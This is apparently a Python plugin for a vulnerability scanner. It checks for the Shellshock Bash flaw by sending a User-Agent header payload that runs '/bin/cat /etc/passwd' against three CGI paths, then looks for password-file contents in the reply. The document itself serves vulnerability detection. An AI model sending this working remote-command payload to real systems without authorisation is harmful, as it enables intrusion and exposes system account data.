#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        base_url = '%s://%s:%s' % (service, ip, port)

        for path in ['/test.cgi', "/cgi-bin/admin.cgi", '/cgi-bin/test-cgi']:
            r = await http_client(ip, port).get(
                base_url + path,
                headers={'User-Agent': '() { foo;}; echo;/bin/cat /etc/passwd'}, timeout=20.0)

            if 'root:x:' in r.text:
                ret = {
                    'alert_group': 'Bash Shell Shock RCE',
                    'affects': base_url,
                    'details': '通过以下的请求可以针对Apache test-cgi的某些版本，造成命令执行并或者系统权限: %s \n, '
                               'result: %s ' % (base_url + path, r.text)
                }

                return ret
    except Exception as e:
        debug(e)

if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
